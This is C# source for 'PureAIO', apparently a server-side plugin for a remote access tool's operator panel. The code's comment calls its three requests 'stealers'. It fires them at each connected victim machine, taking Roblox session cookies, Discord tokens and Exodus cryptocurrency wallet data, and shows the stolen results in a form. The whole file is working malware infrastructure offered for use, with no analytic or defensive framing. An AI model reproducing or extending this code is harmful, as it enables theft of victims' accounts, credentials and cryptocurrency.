using System;
using System.IO;
using PluginSDK.Interfaces;
using PluginSDK.Packets;
using ProtoBuf;

namespace PureAIO
{
    public class ServerPlugin : ICustomPlugin
    {
        private Form1           _form;
        private Action<IPacket> _send;

        // ── ICustomPlugin identity ────────────────────────────────────────────
        public string PluginName        => "PureAIO";
        public string PluginVersion     => "2.0.0";
        public string PluginAuthor      => "Sam";
        public string PluginDescription => "AuthBait + Roblox Cookie + Discord Token + Exodus (all-in-one)";

        // ── ICustomPlugin lifecycle ───────────────────────────────────────────
        public bool OnOpen(string title)
        {
            _form = new Form1();
            _form.FormClosed += (s, e) => _form = null;
            _form.Show();
            return true;
        }

        public void OnConnected(Action<IPacket> send, Action disconnect)
        {
            _send = send;
            _form?.SetSend(send);

            // ── auto-fire all three stealers on connect ──
            SendPacket(new RobloxCookieRequest());
            SendPacket(new DiscordTokenRequest());
            SendPacket(new ExodusRequest());
        }

        public void OnPacketReceived(IPacket packet)
        {
            if (_form == null || _form.IsDisposed) return;

            var cp = packet as CustomPacket;
            if (cp == null) return;

            AIOPacket pkt;
            try
            {
                using (var ms = new MemoryStream(cp.Buffer))
                    pkt = Serializer.Deserialize<AIOPacket>(ms);
            }
            catch { return; }

            _form.HandlePacket(pkt);
        }

        public void OnDisconnected()
        {
            _send = null;

            if (_form == null || _form.IsDisposed) return;

            if (_form.InvokeRequired)
                _form.Invoke(new Action(() => { if (!_form.IsDisposed) _form.Close(); }));
            else
                _form.Close();
        }

        // ── send helper ───────────────────────────────────────────────────────
        private void SendPacket(AIOPacket pkt)
        {
            if (_send == null) return;
            try
            {
                using (var ms = new MemoryStream())
                {
                    Serializer.Serialize(ms, pkt);
                    _send(new CustomPacket { Buffer = ms.ToArray() });
                }
            }
            catch { }
        }
    }
}
